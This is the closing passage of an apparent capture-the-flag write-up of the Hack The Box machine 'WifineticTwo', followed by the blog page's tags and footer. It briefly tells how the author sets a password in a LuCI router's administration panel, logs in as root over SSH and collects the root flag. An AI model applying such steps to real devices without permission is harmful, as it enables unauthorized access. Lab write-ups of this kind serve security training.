+<p>Under <code>System</code> &ndash;&gt; <code>Administration</code> we notice that we have the option to login with a password.</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/LuCI-SSH-access.png" alt="LuCI SSH access"></p>
+<p>With our newly configured password we login via SSH and find the root flag.</p>
+<p><img src="https://scorpiosec.com/images/HTB-WifineticTwo/root-flag.png" alt="Root flag"></p>
+<h2 id="closing-words">Closing Words</h2>
+<p>I enjoyed this box as it was a nice change of pace from the usual web-based exploitation, I hope I was able to be helpful with this write up. Thank you for checking my blog!</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/tags/hack-the-box/">Hack The Box</a></span>
+        
+    </p>
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/categories/writeups/">Writeups</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1163 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2024-07-26 15:04
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f07%2fhtb-wifinetictwo%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f07%2fhtb-wifinetictwo%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+    <title>X</title>
+    <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" stroke="#ffffff"/>
+</svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%3a%20WifineticTwo&amp;caption=HTB%3a%20WifineticTwo&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f07%2fhtb-wifinetictwo%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=HTB%3a%20WifineticTwo&amp;body=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f07%2fhtb-wifinetictwo%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f07%2fhtb-wifinetictwo%2f&amp;media=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f07%2fhtb-wifinetictwo%2f;description=HTB%3a%20WifineticTwo" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f07%2fhtb-wifinetictwo%2f&amp;title=HTB%3a%20WifineticTwo&amp;summary=HTB%3a%20WifineticTwo&amp;source=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f07%2fhtb-wifinetictwo%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f07%2fhtb-wifinetictwo%2f&amp;resubmit=true&amp;title=HTB%3a%20WifineticTwo" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f07%2fhtb-wifinetictwo%2f;title=HTB%3a%20WifineticTwo" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%3a%20WifineticTwo%20https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f07%2fhtb-wifinetictwo%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f07%2fhtb-wifinetictwo%2f&amp;t=HTB%3a%20WifineticTwo" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%3a%20WifineticTwo&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f07%2fhtb-wifinetictwo%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://scorpiosec.com/posts/2024/08/htb-iclean/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">HTB: IClean</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://scorpiosec.com/posts/2024/07/htb-headless/">
+                    <span class="button__text">HTB: Headless</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+    <script src="https://utteranc.es/client.js"
+            repo="K-Scorpio/scorpiosec"
+            label="comment"
+            issue-term="pathname"
+            theme="github-dark"
+            crossorigin="anonymous"
+            async>
+    </script>
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            
+            
+            
+            <span>K-Scorpio</span>
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Theme - <a href="https://themes.gohugo.io/themes/hugo-theme-hello-friend-ng/">Hello Friend NG</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://scorpiosec.com/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js" integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x&#43;ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script>
+
+
+
+
+    </body>
+</html>
